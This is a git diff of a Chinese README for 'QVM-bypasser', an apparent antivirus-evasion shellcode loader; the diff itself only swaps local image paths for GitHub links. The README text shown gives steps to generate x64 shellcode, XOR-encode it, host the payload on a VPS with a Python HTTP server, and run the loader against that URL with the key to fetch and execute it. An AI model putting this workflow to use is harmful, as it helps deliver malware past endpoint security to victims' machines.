@@ -8,7 +8,8 @@
 
 1、生成x64位的shellcode
 
-![image-20231202143904504](.\images\1.png)
+![image-20231202143904504](https://github.com/achuang-x/QVM-bypasser/blob/master/images/1.png)
+
 
 2、使用xor.exe进行异或
 
@@ -18,7 +19,7 @@ Usage: xor.exe <input_filename> <output_filename> <key>
 
 
 
-![image-20231202144301920](images\2.png)
+![image-20231202144301920](https://github.com/achuang-x/QVM-bypasser/blob/master/images/2.png)
 
 3、将生成的 enc.bin 文件上传到 VPS ，开启 HTTP 服务
 
@@ -26,7 +27,7 @@ Usage: xor.exe <input_filename> <output_filename> <key>
 python -m http.server 80
 ```
 
-![image-20231202144526524](images\3.png)
+![image-20231202144526524](https://github.com/achuang-x/QVM-bypasser/blob/master/images/3.png)
 
 4、执行加载
 
@@ -36,12 +37,12 @@ python -m http.server 80
 Usage: QVM-bypasser.exe <url> <xor_key>
 ```
 
-![image-20231202144716758](images\4.png)
+![image-20231202144716758](https://github.com/achuang-x/QVM-bypasser/blob/master/images/4.png)
 
-![image-20231202144833469](images\5.png)
+![image-20231202144833469](https://github.com/achuang-x/QVM-bypasser/blob/master/images/5.png)
 
 
 
 ## 截图
 
-![image-20231202150806484](images\6.png)
+![image-20231202150806484](https://github.com/achuang-x/QVM-bypasser/blob/master/images/6.png)
